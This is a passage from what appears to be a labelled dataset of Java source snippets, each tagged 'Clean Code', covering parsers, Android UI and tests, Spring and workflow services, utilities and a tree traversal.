    return new InjectedFieldResolver(ReflectionUtils.findField(beanType,fieldName,fieldType),""test"");
  }
static class TestBean {
    private String string;
  }
}
",0,Clean Code
"public abstract class NodeVisitor {
  public static final int TYPE_FIRST_INT=0x10;
  public static final int TYPE_INT_BOOLEAN=0x12;
  public static final int TYPE_INT_HEX=0x11;
  public static final int TYPE_REFERENCE=0x01;
  public static final int TYPE_STRING=0x03;
  protected NodeVisitor nv;
  public NodeVisitor(){
    super();
  }
  public NodeVisitor(  NodeVisitor nv){
    super();
    this.nv=nv;
  }
  /** 
 * add attribute to the node
 * @param ns
 * @param name
 * @param resourceId
 * @param type {@link #TYPE_STRING} or others
 * @param obj a string for  {@link #TYPE_STRING} ,and Integer for others
 */
  public void attr(  String ns,  String name,  int resourceId,  int type,  Object obj){
    if (nv != null) {
      nv.attr(ns,name,resourceId,type,obj);
    }
  }
  /** 
 * create a child node
 * @param ns
 * @param name
 * @return
 */
  public NodeVisitor child(  String ns,  String name){
    if (nv != null) {
      return nv.child(ns,name);
    }
    return null;
  }
  /** 
 * end the visit
 */
  public void end(){
    if (nv != null) {
      nv.end();
    }
  }
  /** 
 * line number in the .xml
 * @param ln
 */
  public void line(  int ln){
    if (nv != null) {
      nv.line(ln);
    }
  }
  /** 
 * the node text
 * @param value
 */
  public void text(  int lineNumber,  String value){
    if (nv != null) {
      nv.text(lineNumber,value);
    }
  }
}
",0,Clean Code
"public final class MethodId implements Comparable<MethodId> {
  private final Dex dex;
  private final int declaringClassIndex;
  private final int protoIndex;
  private final int nameIndex;
  public MethodId(  Dex dex,  int declaringClassIndex,  int protoIndex,  int nameIndex){
    this.dex=dex;
    this.declaringClassIndex=declaringClassIndex;
    this.protoIndex=protoIndex;
    this.nameIndex=nameIndex;
  }
  public int getDeclaringClassIndex(){
    return declaringClassIndex;
  }
  public int getProtoIndex(){
    return protoIndex;
  }
  public int getNameIndex(){
    return nameIndex;
  }
  @Override public int compareTo(  MethodId other){
    if (declaringClassIndex != other.declaringClassIndex) {
      return Unsigned.compare(declaringClassIndex,other.declaringClassIndex);
    }
    if (nameIndex != other.nameIndex) {
      return Unsigned.compare(nameIndex,other.nameIndex);
    }
    return Unsigned.compare(protoIndex,other.protoIndex);
  }
  public void writeTo(  Dex.Section out){
    out.writeUnsignedShort(declaringClassIndex);
    out.writeUnsignedShort(protoIndex);
    out.writeInt(nameIndex);
  }
  @Override public String toString(){
    if (dex == null) {
      return declaringClassIndex + "" "" + protoIndex+ "" ""+ nameIndex;
    }
    return dex.typeNames().get(declaringClassIndex) + ""."" + dex.strings().get(nameIndex)+ dex.readTypeList(dex.protoIds().get(protoIndex).getParametersOffset());
  }
}
",0,Clean Code
"public class AzkabanWorkflowParser implements WorkflowParser {
  @Override public Workflow parse(  JsonObject flowJson,  Workflow workflow){
    AzkabanWorkflow azkabanWorkflow=new AzkabanWorkflow();
    try {
      BeanUtils.copyProperties(azkabanWorkflow,workflow);
    }
 catch (    Exception e) {
      throw new DSSRuntimeException(91500,""Copy workflow fields failed!"",e);
    }
    return addEndNodeForFlowName(azkabanWorkflow);
  }
  private AzkabanWorkflow addEndNodeForFlowName(  AzkabanWorkflow flow){
    DSSNodeDefault endNode=new DSSNodeDefault();
    List<WorkflowNode> endNodeList=getFlowEndJobList(flow);
    if (flow.getRootFlow()) {
      endNode.setId(flow.getName());
      endNode.setName(flow.getName());
    }
 else {
      endNode.setId(flow.getName() + ""_"");
      endNode.setName(flow.getName() + ""_"");
    }
    endNode.setNodeType(""linkis.control.empty"");
    Map<String,Object> jobContentMap=new HashMap<>();
    endNode.setJobContent(jobContentMap);
    if (!endNodeList.isEmpty()) {
      if (endNodeList.size() == 1) {
        if (endNodeList.get(0).getName().equals(flow.getName())) {
          return flow;
        }
      }
      endNodeList.forEach(tmpNode -> endNode.addDependency(tmpNode.getName()));
      WorkflowNode azkabanSchedulerNode=new WorkflowNodeImpl();
      azkabanSchedulerNode.setDSSNode(endNode);
      flow.getWorkflowNodes().add(azkabanSchedulerNode);
    }
    return flow;
  }
  private List<WorkflowNode> getFlowEndJobList(  AzkabanWorkflow flow){
    List<WorkflowNode> res=new ArrayList<>();
    for (    WorkflowNode job : flow.getWorkflowNodes()) {
      int flag=0;
      for (      WorkflowNodeEdge link : flow.getWorkflowNodeEdges()) {
        if (job.getId().equals(link.getDSSEdge().getSource())) {
          flag=1;
        }
      }
      if (flag == 0) {
        res.add(job);
      }
    }
    return res;
  }
  @Override public int getOrder(){
    return 100;
  }
}
",0,Clean Code
"/** 
 * Tests for SwipeRefreshMultipleViews sample.
 */
public class SampleTests extends ActivityInstrumentationTestCase2<MainActivity> {
  private MainActivity mTestActivity;
  private SwipeRefreshMultipleViewsFragment mTestFragment;
  private SwipeRefreshLayout mSwipeRefreshLayout;
  public SampleTests(){
    super(MainActivity.class);
  }
  @Override protected void setUp() throws Exception {
    super.setUp();
    mTestActivity=getActivity();
    mTestFragment=(SwipeRefreshMultipleViewsFragment)mTestActivity.getSupportFragmentManager().getFragments().get(1);
    mSwipeRefreshLayout=(SwipeRefreshLayout)mTestFragment.getView().findViewById(R.id.swiperefresh);
  }
  /** 
 * Test if the test fixture has been set up correctly.
 */
  public void testPreconditions(){
    assertNotNull(""mTestActivity is null"",mTestActivity);
    assertNotNull(""mTestFragment is null"",mTestFragment);
    assertNotNull(""mSwipeRefreshLayout is null"",mSwipeRefreshLayout);
  }
  /** 
 * Test that swiping on the empty view triggers a refresh.
 */
  public void testSwipingEmptyView(){
    TouchUtils.dragViewBy(this,mSwipeRefreshLayout,Gravity.CENTER,0,Math.round(mSwipeRefreshLayout.getHeight() * 0.4f));
    getInstrumentation().runOnMainSync(new Runnable(){
      @Override public void run(){
        assertTrue(mSwipeRefreshLayout.isRefreshing());
      }
    }
);
  }
  /** 
 * Test that swiping on the populated list triggers a refresh.
 */
  public void testSwipingListView(){
    populateList();
    TouchUtils.dragViewBy(this,mSwipeRefreshLayout,Gravity.CENTER,0,Math.round(mSwipeRefreshLayout.getHeight() * 0.4f));
    getInstrumentation().runOnMainSync(new Runnable(){
      @Override public void run(){
        assertTrue(mSwipeRefreshLayout.isRefreshing());
      }
    }
);
  }
  /** 
 * Test that selecting the refresh menu item triggers a refresh.
 */
  public void testRefreshMenuItem(){
    getInstrumentation().invokeMenuActionSync(mTestActivity,R.id.menu_refresh,0);
    assertTrue(mSwipeRefreshLayout.isRefreshing());
  }
  private void populateList(){
    getInstrumentation().invokeMenuActionSync(mTestActivity,R.id.menu_refresh,0);
    while (mSwipeRefreshLayout.isRefreshing()) {
    }
  }
}
",0,Clean Code
"public class NotificationView extends FrameLayout {
  protected Context mContext;
  private TextView mTvMessage;
  private Button mBtnConfirm;
  private int mDurationMS;
  private final Runnable mDismissRun=new Runnable(){
    @Override public void run(){
      setVisibility(GONE);
    }
  }
;
  public NotificationView(  Context context){
    this(context,null);
  }
  public NotificationView(  Context context,  AttributeSet attrs){
    this(context,attrs,0);
  }
  public NotificationView(  Context context,  AttributeSet attrs,  int defStyleAttr){
    super(context,attrs,defStyleAttr);
    TypedArray typedArray=context.obtainStyledAttributes(attrs,R.styleable.NotificationView);
    mDurationMS=typedArray.getInt(R.styleable.NotificationView_durationMS,DURATION_FOREVER);
    typedArray.recycle();
    mContext=context;
    setVisibility(GONE);
    View roomView=inflate(mContext,R.layout.tuiroomkit_layout_notification,this);
    mTvMessage=roomView.findViewById(R.id.tuiroomkit_notification_message);
    mBtnConfirm=roomView.findViewById(R.id.tuiroomkit_notification_confirm);
  }
  public NotificationView setMessage(  String message){
    mTvMessage.setText(message);
    return this;
  }
  public NotificationView setDuration(  int duration){
    mDurationMS=duration;
    return this;
  }
  public int getDuration(){
    return mDurationMS;
  }
  public NotificationView setClickListener(  OnClickListener clickListener){
    mBtnConfirm.setOnClickListener(clickListener);
    return this;
  }
  public void show(){
    setVisibility(VISIBLE);
    removeCallbacks(mDismissRun);
    if (mDurationMS == DURATION_FOREVER) {
      return;
    }
    postDelayed(mDismissRun,mDurationMS);
  }
  public void dismiss(){
    setVisibility(GONE);
    removeCallbacks(mDismissRun);
  }
  @Override protected void onDetachedFromWindow(){
    super.onDetachedFromWindow();
    removeCallbacks(mDismissRun);
  }
}",0,Clean Code
"@Command(mixinStandardHelpOptions=true,description=""Generate the Java source for the Spring Bootstrap class."") public class GenerateBootstrapCommand implements Callable<Integer> {
  @Option(names=""--main-class"",description=""The main class, auto-detected if not provided."") private String mainClass;
  @Option(names=""--application-class"",description=""The application class, auto-detected if not provided."") private String applicationClass;
  @Option(names=""--mode"",required=true,description=""The mode which could be native or native-agent"") private String mode;
  @Option(names={""--sources-out""},required=true,description=""Output path for the generated sources."") private Path sourceOutputPath;
  @Option(names={""--resources-out""},required=true,description=""Output path for the generated resources."") private Path resourcesOutputPath;
  @Option(names={""--classes""},required=true,split=""${sys:path.separator}"",description=""Paths to the application compiled classes."") private List<Path> classesPaths;
  @Option(names={""--resources""},required=true,split=""${sys:path.separator}"",description=""Paths to the application compiled resources."") private Set<Path> resourcesPaths;
  @Option(names={""--debug""},description=""Enable debug logging."") private boolean isDebug;
  @Option(names={""--remove-yaml""},description=""Remove Yaml support."") private boolean removeYaml;
  @Option(names={""--remove-jmx""},description=""Remove JMX support."") private boolean removeJmx;
  @Option(names={""--remove-xml""},description=""Remove XML support."") private boolean removeXml;
  @Option(names={""--remove-spel""},description=""Remove SpEL support."") private boolean removeSpel;
  @Override public Integer call() throws Exception {
    AotOptions aotOptions=new AotOptions();
    aotOptions.setMode(this.mode);
    aotOptions.setDebugVerify(this.isDebug);
    aotOptions.setRemoveYamlSupport(this.removeYaml);
    aotOptions.setRemoveJmxSupport(this.removeJmx);
    aotOptions.setRemoveXmlSupport(this.removeXml);
    aotOptions.setRemoveSpelSupport(this.removeSpel);
    ConfigurableEnvironment environment=new StandardEnvironment();
    LogFile logFile=LogFile.get(environment);
    LoggingInitializationContext initializationContext=new LoggingInitializationContext(environment);
    ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
    LoggingSystem loggingSystem=LoggingSystem.get(classLoader);
    loggingSystem.initialize(initializationContext,null,logFile);
    if (this.isDebug) {
      loggingSystem.setLogLevel(null,LogLevel.DEBUG);
    }
    List<BootstrapContributor> bootstrapContributors=SpringFactoriesLoader.loadFactories(BootstrapContributor.class,classLoader);
    BootstrapCodeGenerator generator=new BootstrapCodeGenerator(aotOptions,bootstrapContributors);
    String[] classPath=StringUtils.tokenizeToStringArray(System.getProperty(""java.class.path""),File.pathSeparator);
    ApplicationStructure applicationStructure=new ApplicationStructure(this.sourceOutputPath,this.resourcesOutputPath,this.resourcesPaths,this.classesPaths,this.mainClass,this.applicationClass,Collections.emptyList(),Arrays.asList(classPath),classLoader);
    generator.generate(AotPhase.MAIN,applicationStructure);
    return 0;
  }
  public static void main(  String[] args) throws IOException {
    int exitCode=new CommandLine(new GenerateBootstrapCommand()).execute(args);
    System.exit(exitCode);
  }
}
",0,Clean Code
"public class Constant {
  public static final int INTERVAL_SEEK=10 * 1000;
  public static final int INTERVAL_HIDE=5 * 1000;
  public static final int INTERVAL_TRAFFIC=500;
  public static final int TIMEOUT_VOD=30 * 1000;
  public static final int TIMEOUT_LIVE=30 * 1000;
  public static final int TIMEOUT_EPG=5 * 1000;
  public static final int TIMEOUT_PLAY=15 * 1000;
  public static final int TIMEOUT_PARSE_DEF=15 * 1000;
  public static final int TIMEOUT_PARSE_WEB=15 * 1000;
  public static final int TIMEOUT_PARSE_LIVE=10 * 1000;
  public static final int TIMEOUT_SYNC=2 * 1000;
  public static final int THREAD_POOL=5;
}",0,Clean Code
"/** 
 * Desc: Created by zhisheng on 2019-06-05 blog：http://www.54tianzhisheng.cn/ 微信公众号：zhisheng
 */
public class SimpleTopicSelector implements TopicSelector<Map> {
  private static final Logger LOG=LoggerFactory.getLogger(SimpleTopicSelector.class);
  private final String topicFieldName;
  private final String defaultTopicName;
  private final String tagFieldName;
  private final String defaultTagName;
  public SimpleTopicSelector(  String topicFieldName,  String defaultTopicName,  String tagFieldName,  String defaultTagName){
    this.topicFieldName=topicFieldName;
    this.defaultTopicName=defaultTopicName;
    this.tagFieldName=tagFieldName;
    this.defaultTagName=defaultTagName;
  }
  @Override public String getTopic(  Map tuple){
    if (tuple.containsKey(topicFieldName)) {
      Object topic=tuple.get(topicFieldName);
      return topic != null ? topic.toString() : defaultTopicName;
    }
 else {
      LOG.warn(""Field {} Not Found. Returning default topic {}"",topicFieldName,defaultTopicName);
      return defaultTopicName;
    }
  }
  @Override public String getTag(  Map tuple){
    if (tuple.containsKey(tagFieldName)) {
      Object tag=tuple.get(tagFieldName);
      return tag != null ? tag.toString() : defaultTagName;
    }
 else {
      LOG.warn(""Field {} Not Found. Returning default tag {}"",tagFieldName,defaultTagName);
      return defaultTagName;
    }
  }
}
",0,Clean Code
"public static class Result implements ExecutionResult {
  private final int exitCode;
  private final List<String> args;
  private final List<String> log;
  public Result(  List<String> args,  int exitCode,  List<String> log){
    super();
    this.args=new ArrayList<>(args);
    this.exitCode=exitCode;
    this.log=log;
  }
  @Override public Result assertFailure(){
    if (exitCode == 0) {
      final StringBuilder sb=ExecutionResult.appendCommand(new StringBuilder(""mvnd returned "").append(exitCode).append("" instead of non-zero exit code: ""),args);
      sb.append(""\n--- stderr+stdout start ---"");
synchronized (log) {
        log.forEach(s -> sb.append('\n').append(s));
      }
      sb.append(""\n--- stderr+stdout end ---"");
      throw new AssertionError(sb);
    }
    return this;
  }
  @Override public Result assertSuccess(){
    if (exitCode != 0) {
      final StringBuilder sb=ExecutionResult.appendCommand(new StringBuilder(""mvnd returned "").append(exitCode).append("", args: ""),args);
      if (exitCode == CommandProcess.TIMEOUT_EXIT_CODE) {
        sb.append("" (timeout)"");
      }
      sb.append(""\n--- stderr+stdout start ---"");
synchronized (log) {
        log.forEach(s -> sb.append('\n').append(s));
      }
      sb.append(""\n--- stderr+stdout end ---"");
      throw new AssertionError(sb);
    }
    return this;
  }
  @Override public int getExitCode(){
    return exitCode;
  }
  @Override public boolean isSuccess(){
    return exitCode == 0;
  }
}
",0,Clean Code
"/** 
 * If the current task implements  {@link RejectedRunnable}, then the users will be allowed to implement user-defined rejecting, otherwise some of the existing tasks in the queue will be discarded in FIFO mode.
 * @author jiachun.fjc
 */
public class RejectedTaskPolicyWithReport extends AbstractRejectedExecutionHandler {
  public RejectedTaskPolicyWithReport(  String threadPoolName){
    super(threadPoolName,false,"""");
  }
  public RejectedTaskPolicyWithReport(  String threadPoolName,  String dumpPrefixName){
    super(threadPoolName,true,dumpPrefixName);
  }
  @Override public void rejectedExecution(  final Runnable r,  final ThreadPoolExecutor e){
    LOG.error(""Thread pool [{}] is exhausted! {}."",threadPoolName,e.toString());
    dumpJvmInfoIfNeeded();
    if (r instanceof RejectedRunnable) {
      ((RejectedRunnable)r).rejected();
    }
 else {
      if (!e.isShutdown()) {
        final BlockingQueue<Runnable> queue=e.getQueue();
        final int discardSize=queue.size() >> 1;
        for (int i=0; i < discardSize; i++) {
          queue.poll();
        }
        try {
          queue.put(r);
        }
 catch (        final InterruptedException ignored) {
        }
      }
    }
  }
}",0,Clean Code
"public static class Hive_itemContext extends ParserRuleContext {
  public TerminalNode T_SUB(){
    return getToken(HiveSqlParser.T_SUB,0);
  }
  public IdentContext ident(){
    return getRuleContext(IdentContext.class,0);
  }
  public ExprContext expr(){
    return getRuleContext(ExprContext.class,0);
  }
  public TerminalNode L_ID(){
    return getToken(HiveSqlParser.L_ID,0);
  }
  public TerminalNode T_EQUAL(){
    return getToken(HiveSqlParser.T_EQUAL,0);
  }
  public Hive_itemContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_hive_item;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).enterHive_item(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).exitHive_item(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof HiveSqlVisitor)     return ((HiveSqlVisitor<? extends T>)visitor).visitHive_item(this);
 else     return visitor.visitChildren(this);
  }
}",0,Clean Code
"/** 
 * Static utility methods pertaining to  {@link Map} instances.
 * @author jiachun.fjc
 */
public final class Maps {
  /** 
 * Creates a mutable, empty  {@code HashMap} instance.
 */
  public static <K,V>HashMap<K,V> newHashMap(){
    return new HashMap<>();
  }
  /** 
 * Creates a  {@code HashMap} instance, with a high enough ""initial capacity""that it should hold  {@code expectedSize} elements without growth.
 */
  public static <K,V>HashMap<K,V> newHashMapWithExpectedSize(  int expectedSize){
    return new HashMap<>(capacity(expectedSize));
  }
  /** 
 * Creates an  {@code IdentityHashMap} instance.
 */
  public static <K,V>IdentityHashMap<K,V> newIdentityHashMap(){
    return new IdentityHashMap<>();
  }
  /** 
 * Creates an  {@code IdentityHashMap} instance, with a high enough ""initial capacity""that it should hold  {@code expectedSize} elements without growth.
 */
  public static <K,V>IdentityHashMap<K,V> newIdentityHashMapWithExpectedSize(  int expectedSize){
    return new IdentityHashMap<>(capacity(expectedSize));
  }
  /** 
 * Creates a mutable, empty, insertion-ordered  {@code LinkedHashMap} instance.
 */
  public static <K,V>LinkedHashMap<K,V> newLinkedHashMap(){
    return new LinkedHashMap<>();
  }
  /** 
 * Creates a mutable, empty  {@code TreeMap} instance using the natural ordering of its elements.
 */
  public static <K extends Comparable,V>TreeMap<K,V> newTreeMap(){
    return new TreeMap<>();
  }
  /** 
 * Creates a mutable, empty  {@code ConcurrentMap} instance.
 */
  public static <K,V>ConcurrentMap<K,V> newConcurrentMap(){
    return new ConcurrentHashMap<>();
  }
  /** 
 * Creates a  {@code ConcurrentMap} instance, with a high enough ""initial capacity""that it should hold  {@code expectedSize} elements without growth.
 */
  public static <K,V>ConcurrentMap<K,V> newConcurrentMap(  int initialCapacity){
    return new ConcurrentHashMap<>(initialCapacity);
  }
  /** 
 * Creates a mutable, empty  {@code ConcurrentHashMap} instance.
 */
  public static <V>ConcurrentMap<Long,V> newConcurrentMapLong(){
    return new ConcurrentHashMap<>();
  }
  /** 
 * Creates a  {@code ConcurrentHashMap} instance, with a high enough ""initial capacity""that it should hold  {@code expectedSize} elements without growth.
 */
  public static <V>ConcurrentMap<Long,V> newConcurrentMapLong(  int initialCapacity){
    return new ConcurrentHashMap<>(initialCapacity);
  }
  /** 
 * Returns a capacity that is sufficient to keep the map from being resized as long as it grows no larger than expectedSize and the load factor is >= its default (0.75).
 */
  private static int capacity(  int expectedSize){
    if (expectedSize < 3) {
      Requires.requireTrue(expectedSize >= 0,""expectedSize cannot be negative but was: "" + expectedSize);
      return expectedSize + 1;
    }
    if (expectedSize < Ints.MAX_POWER_OF_TWO) {
      return expectedSize + expectedSize / 3;
    }
    return Integer.MAX_VALUE;
  }
  private Maps(){
  }
}",0,Clean Code
"public class SchedulerThreadTest extends AbstractSchedulerTest {
  @Inject protected FlowListeners flowListenersService;
  @Inject protected SchedulerExecutionStateInterface executionState;
  @Test void thread() throws Exception {
    Flow flow=createThreadFlow();
    CountDownLatch queueCount=new CountDownLatch(2);
    Flux<Execution> receive=TestsUtils.receive(executionQueue,throwConsumer(either -> {
      Execution execution=either.getLeft();
      assertThat(execution.getFlowId(),is(flow.getId()));
      if (execution.getState().getCurrent() != State.Type.SUCCESS) {
        executionQueue.emit(execution.withState(State.Type.SUCCESS));
        queueCount.countDown();
      }
    }
));
    FlowListeners flowListenersServiceSpy=spy(this.flowListenersService);
    SchedulerExecutionStateInterface schedulerExecutionStateSpy=spy(this.executionState);
    doReturn(Collections.singletonList(flow)).when(flowListenersServiceSpy).flows();
    doAnswer(invocation -> Optional.of(Execution.builder().state(new State().withState(State.Type.SUCCESS)).build())).when(schedulerExecutionStateSpy).findById(any(),any());
    try (AbstractScheduler scheduler=new JdbcScheduler(applicationContext,flowListenersServiceSpy);Worker worker=applicationContext.createBean(TestMethodScopedWorker.class,IdUtils.create(),8,null)){
      worker.run();
      scheduler.run();
      boolean sawSuccessExecution=queueCount.await(1,TimeUnit.MINUTES);
      Execution last=receive.blockLast();
      assertThat(""Countdown latch returned "" + sawSuccessExecution,last,notNullValue());
      assertThat(last.getTrigger().getVariables().get(""defaultInjected""),is(""done""));
      assertThat(last.getTrigger().getVariables().get(""counter""),is(3));
      assertThat(last.getLabels(),hasItem(new Label(""flow-label-1"",""flow-label-1"")));
      assertThat(last.getLabels(),hasItem(new Label(""flow-label-2"",""flow-label-2"")));
      AbstractSchedulerTest.COUNTER=0;
    }
   }
}
",0,Clean Code
"public abstract class FilesService {
  public static Map<String,String> inputFiles(  RunContext runContext,  Object inputs) throws Exception {
    return FilesService.inputFiles(runContext,Collections.emptyMap(),inputs);
  }
  public static Map<String,String> inputFiles(  RunContext runContext,  Map<String,Object> additionalVars,  Object inputs) throws Exception {
    Logger logger=runContext.logger();
    Map<String,String> inputFiles=new HashMap<>(inputs == null ? Map.of() : PluginUtilsService.transformInputFiles(runContext,additionalVars,inputs));
    inputFiles.forEach(throwBiConsumer((fileName,input) -> {
      var file=new File(runContext.workingDir().path().toString(),runContext.render(fileName,additionalVars));
      if (!file.getParentFile().exists()) {
        file.getParentFile().mkdirs();
      }
      if (input == null) {
        file.createNewFile();
      }
 else {
        if (input.startsWith(""kestra://"")) {
          try (var is=runContext.storage().getFile(URI.create(input));var out=new FileOutputStream(file)){
            IOUtils.copyLarge(is,out);
          }
         }
 else {
          Files.write(file.toPath(),input.getBytes());
        }
      }
    }
));
    if (logger.isTraceEnabled()) {
      logger.trace(""Provided {} input(s)."",inputFiles.size());
    }
    return inputFiles;
  }
  public static Map<String,URI> outputFiles(  RunContext runContext,  List<String> outputs) throws Exception {
    List<String> renderedOutputs=outputs != null ? runContext.render(outputs) : null;
    List<Path> allFilesMatching=runContext.workingDir().findAllFilesMatching(renderedOutputs);
    var outputFiles=allFilesMatching.stream().map(throwFunction(path -> new AbstractMap.SimpleEntry<>(runContext.workingDir().path().relativize(path).toString(),runContext.storage().putFile(path.toFile(),resolveUniqueNameForFile(path))))).collect(Collectors.toMap(Map.Entry::getKey,Map.Entry::getValue));
    if (runContext.logger().isTraceEnabled()) {
      runContext.logger().trace(""Captured {} output(s)."",allFilesMatching.size());
    }
    return outputFiles;
  }
  private static String resolveUniqueNameForFile(  final Path path){
    return IdUtils.from(path.toString()) + ""-"" + path.toFile().getName();
  }
}
",0,Clean Code
"@Component(ServiceNameConsts.ENTRANCE_CONTEXT) public class DefaultEntranceContext extends EntranceContext {
  private static final Logger logger=LoggerFactory.getLogger(DefaultEntranceContext.class);
  @Autowired private EntranceParser entranceParser;
  @Autowired private PersistenceManager persistenceManager;
  @Autowired private LogManager logManager;
  @Autowired private Scheduler scheduler;
  @Autowired @Qualifier(ServiceNameConsts.ENTRANCE_INTERCEPTOR) private EntranceInterceptor[] entranceInterceptors;
  @Autowired private EntranceEventListenerBus<EntranceEventListener,EntranceEvent> listenerBus;
  public DefaultEntranceContext(  EntranceParser entranceParser,  PersistenceManager persistenceManager,  LogManager logManager,  Scheduler scheduler,  EntranceInterceptor[] entranceInterceptors,  EntranceEventListenerBus<EntranceEventListener,EntranceEvent> listenerBus){
    this.entranceParser=entranceParser;
    this.persistenceManager=persistenceManager;
    this.logManager=logManager;
    this.scheduler=scheduler;
    this.entranceInterceptors=entranceInterceptors;
    this.listenerBus=listenerBus;
  }
  public DefaultEntranceContext(){
  }
  @PostConstruct public void init(){
    entranceParser.setEntranceContext(this);
    logger.info(""Finished init entranceParser from postConstruct end!"");
    persistenceManager.setEntranceContext(this);
    logManager.setEntranceContext(this);
  }
  @Override public Scheduler getOrCreateScheduler(){
    return scheduler;
  }
  @Override public EntranceParser getOrCreateEntranceParser(){
    return this.entranceParser;
  }
  @Override public EntranceInterceptor[] getOrCreateEntranceInterceptors(){
    return entranceInterceptors;
  }
  @Override public LogManager getOrCreateLogManager(){
    return logManager;
  }
  @Override public PersistenceManager getOrCreatePersistenceManager(){
    return persistenceManager;
  }
  @Override public EntranceEventListenerBus<EntranceEventListener,EntranceEvent> getOrCreateEventListenerBus(){
    return this.listenerBus;
  }
}
",0,Clean Code
"/** 
 * Applies remove or replace of certain characters based on condition. 
 */
public class TextCleaner implements TextProcessor {
  private Function<Character,Boolean> condition;
  private char replace;
  /** 
 * Remove a character if it meets the condition supplied.
 * @param condition lambda function that defines whether a character meets condition
 */
  public TextCleaner(  Function<Character,Boolean> condition){
    this.condition=condition;
  }
  /** 
 * Replace a character if it meets the condition supplied.
 * @param condition lambda function that defines whether a character meets condition
 * @param replace the character to replace
 */
  public TextCleaner(  Function<Character,Boolean> condition,  char replace){
    this.condition=condition;
    this.replace=replace;
  }
  private String cleanText(  String text){
    StringBuilder sb=new StringBuilder();
    for (    char c : text.toCharArray()) {
      if (condition.apply(c)) {
        if (replace == '\u0000') {
          continue;
        }
 else {
          sb.append(replace);
        }
      }
 else {
        sb.append(c);
      }
    }
    return sb.toString();
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public List<String> preprocess(  List<String> tokens){
    return tokens.stream().map(this::cleanText).collect(Collectors.toList());
  }
}
",0,Clean Code
"@Service public class ProfilerStopProcessor extends AbstractCommand<String> {
  private static final Logger LOGGER=LoggerFactory.getLogger(ProfilerStopProcessor.class);
  @Resource private ProfilerManager profilerManager;
  @Override public Set<Integer> getCodes(){
    return ImmutableSet.of(CommandCode.REQ_TYPE_PROFILER_STOP.getCode());
  }
  @Override public int getMinAgentVersion(){
    return 12;
  }
  @Override public boolean supportMulti(){
    return false;
  }
  @Override protected String prepareCommand(  RequestData<String> data,  String agentId){
    return data.getCommand() + BistouryConstants.PID_PARAM + BistouryConstants.FILL_PID;
  }
  @Override public Datagram prepareResponse(  Datagram datagram){
    try {
      Optional<TypeResponse<Map<String,String>>> responseRef=ProfilerDatagramHelper.getProfilerResponse(datagram);
      if (responseRef.isPresent() && isSuccess(responseRef.get())) {
        String profilerId=ProfilerDatagramHelper.getProfilerId(responseRef.get());
        if (Strings.isNullOrEmpty(profilerId)) {
          return datagram;
        }
 else {
          profilerManager.stop(profilerId);
        }
      }
    }
 catch (    Exception e) {
      LOGGER.error(""stop profiler error."",e);
    }
    return datagram;
  }
  private boolean isSuccess(  TypeResponse<Map<String,String>> response){
    return ProfilerDatagramHelper.getResultState(response);
  }
}
",0,Clean Code
"public class ProtoApplication {
  private static final Logger logger=Logger.getLogger(ProtoApplication.class.getName());
  private Server server;
  private void start() throws IOException {
    int port=50051;
    server=ServerBuilder.forPort(port).addService(ProtoReflectionService.newInstance()).addService(new GreeterImpl()).build().start();
    logger.info(""Server started, listening on "" + port);
    Runtime.getRuntime().addShutdownHook(new Thread(){
      @Override public void run(){
        System.err.println(""*** shutting down gRPC server since JVM is shutting down"");
        ProtoApplication.this.stop();
        System.err.println(""*** server shut down"");
      }
    }
);
  }
  private void stop(){
    if (server != null) {
      server.shutdown();
    }
  }
  /** 
 * Await termination on the main thread since the grpc library uses daemon threads.
 */
  private void blockUntilShutdown() throws InterruptedException {
    if (server != null) {
      server.awaitTermination();
    }
  }
  public static void main(  String[] args) throws Exception {
    final ProtoApplication server=new ProtoApplication();
    server.start();
    server.blockUntilShutdown();
  }
}
",0,Clean Code
"/** 
 * @author enjoyyin
 * @date 2022-03-14
 * @since 0.5.0
 */
public class ProjectOperationUtils {
  public static <K extends StructureRequestRef,V extends ResponseRef>void tryProjectOperation(  BiPredicate<AppConn,AppInstance> isTryOperation,  Workspace workspace,  Function<ProjectService,StructureOperation> getProjectOperation,  Consumer<DSSProjectContentRequestRef> dssProjectContentRequestRefConsumer,  BiConsumer<AppInstance,RefProjectContentRequestRef> refProjectContentRequestRefConsumer,  BiFunction<StructureOperation,K,V> responseRefConsumer,  BiConsumer<ImmutablePair<AppConn,AppInstance>,V> dealResponseRefConsumer,  String errorMsg){
    AppConnManager.getAppConnManager().listAppConns().stream().sorted((appConn1,appConn2) -> {
      if (appConn1 instanceof SchedulerAppConn) {
        return -1;
      }
 else       if (appConn2 instanceof SchedulerAppConn) {
        return 1;
      }
 else {
        return 0;
      }
    }
).filter(appConn -> appConn instanceof OnlyStructureAppConn).forEach(appConn -> {
      StructureIntegrationStandard structureStandard=((OnlyStructureAppConn)appConn).getOrCreateStructureStandard();
      appConn.getAppDesc().getAppInstances().forEach(appInstance -> {
        if (isTryOperation == null || isTryOperation.test(appConn,appInstance)) {
          V responseRef=StructureOperationUtils.tryProjectOperation(() -> structureStandard.getProjectService(appInstance),getProjectOperation,dssProjectContentRequestRefConsumer,refProjectContentRequestRef -> refProjectContentRequestRefConsumer.accept(appInstance,refProjectContentRequestRef),(structureOperation,structureRequestRef) -> {
            structureRequestRef.setDSSLabels(appInstance.getLabels()).setWorkspace(workspace);
            return responseRefConsumer.apply(structureOperation,(K)structureRequestRef);
          }
,appConn.getAppDesc().getAppName() + "" try to "" + errorMsg);
          if (dealResponseRefConsumer != null) {
            dealResponseRefConsumer.accept(new ImmutablePair<>(appConn,appInstance),responseRef);
          }
        }
      }
);
    }
);
  }
}
",0,Clean Code
"/** 
 * @author 小六六
 * @version 1.0
 * @date 2020/10/20 10:40二叉树的前序遍历
 */
public class Tree {
  public static void main(  String[] args){
    TreeNode[] node=new TreeNode[10];
    for (int i=0; i < 10; i++) {
      node[i]=new TreeNode(i);
    }
    for (int i=0; i < 10; i++) {
      if (i * 2 + 1 < 10) {
        node[i].left=node[i * 2 + 1];
      }
      if (i * 2 + 2 < 10) {
        node[i].right=node[i * 2 + 2];
      }
    }
    preOrderRe(node[0]);
  }
  private static void preOrderRe(  TreeNode biTree){
    System.out.println(biTree.value);
